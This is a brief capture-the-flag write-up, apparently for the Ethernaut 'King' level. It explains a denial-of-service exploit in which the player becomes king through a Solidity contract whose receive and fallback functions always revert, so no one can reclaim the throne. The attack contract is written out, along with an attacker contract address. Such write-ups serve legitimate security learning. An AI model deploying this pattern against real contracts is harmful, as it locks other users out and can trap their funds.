# King

The ponzi starts with 0.001 ether. We can exploit the game by giving a larger ether, but via a contract that disallows receiving ether. This way, if someone puts more money the game will revert as they can't send our money back. As such, we become the king. In this game particular, the owner is allowed to reclaim the kings throne but even they can't do it for the same reason!

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
 
contract Attack { 
 
    receive() external payable {
        revert();
    }
    fallback() external payable {
        revert();
    }

}
```

(see '0x42e9167d17F22998FA824f02bf8F62Cc28403395' my attacker)


todo